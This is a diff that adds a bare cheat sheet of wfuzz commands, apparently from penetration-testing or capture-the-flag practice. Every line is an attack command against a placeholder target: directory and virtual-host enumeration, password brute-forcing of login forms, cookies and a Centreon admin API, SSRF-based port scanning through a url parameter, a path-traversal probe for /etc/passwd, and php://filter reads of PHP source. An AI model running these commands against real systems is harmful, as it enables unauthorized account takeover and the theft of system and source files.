@@ -1,0 +1,49 @@
+wfuzz -u http://domain.com/api/v1/user/FUZZ -X POST --hc 405,404 -w /opt/SecLists/Discovery/Web-Content/common.txt 
+
+wfuzz -u $URL -H "Host: FUZZ" -w /usr/share/seclists/Discovery/DNS/namelist.txt --hc 200 -hh 422
+
+wfuzz -u $URL/centreon/api/index.php?action=authenticate -d 'username=admin&password=FUZZ' -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt --hc 403
+
+wfuzz -u $URL/index.php -d 'anchor=&username=$username&password=$passwordFUZZ' -w /usr/share/seclists/Fuzzing/special-chars.txt
+
+wfuzz -u $URL -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt -H 'Host: FUZZ.$URL' --hw 28
+
+wfuzz -u $URL -w darkweb2017-top10000.txt -b password=FUZZ --hh 324
+
+wfuzz -c -u $URL/FUZZ -w /usr/share/wordlists/dirb/common.txt
+
+wfuzz -c -u $URL -X POST -d "user=FUZZ&pass=FUZZ&action=login" -w top-usernames-shortlist.txt --hh 11 
+
+wfuzz -c -u $URL/FUZZ -w /usr/share/wordlists/dirb/common.txt 
+
+wfuzz -c -z range 1,65535 http://$IP:60000/url.php?path=http://localhost:FUZZ --hl=2
+
+wfuzz -c -z range,1-65535 '$URL/socket?port=FUZZ&cmd=HELLO'
+
+wfuzz -c -z file,names.txt -d "username=FUZZ&password=$mysecretpassword1234lol" $URL/login.php --hw 657
+
+wfuzz -c -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt -d 'username=admin&password=FUZZ&submit=login' $URL --hw 36 
+
+wfuzz -c -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt -H 'Cookie: password=FUZZ' $URL/ --hw 29 
+
+wfuzz -c -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt '$URL/socket?port=80&cmd=FUZZ'
+
+wfuzz -c -w subdomains-top1mil-5000.txt -H "HOST:FUZZ.$URL" $URL --hw 28 
+
+wfuzz -w top-usernames-shortlist.txt $URL/login.php -d 'inputUsername=FUZZ&inputOTP=1234' 
+
+wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -z list,-.pdf  $URL/FUZZFUZ2Z --hc 404,403
+
+wfuzz -w /usr/share/wordlists/dirb/common.txt $URL/FUZZ --hc 404,403 
+
+wfuzz -w pass.txt -L 20 -d "username=david&password=FUZZ" $URL -hw 1224
+
+wfuzz -w /usr/share/seclists/Fuzzing/special-chars -d db=startrekFUZZ $URL --hh 293
+
+wfuzz -z file, /usr/share/wordlists/wfuzz/general/common.txt -b "$cookie" --sc 200 $URL?username=FUZZ
+
+wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hw 0 -u 'http://$IP/image.php?FUZZ=../../../etc/passwd'
+
+wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt --hw 0 -u 'http://$IP/image.php?img=php://FilTer/convert.base64-encode/resource=FUZZ'
+
+wfuzz -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hc 400,404,403 -H "Host: FUZZ.domain.com" -u http://domain.com/ -t 10 --hw 0
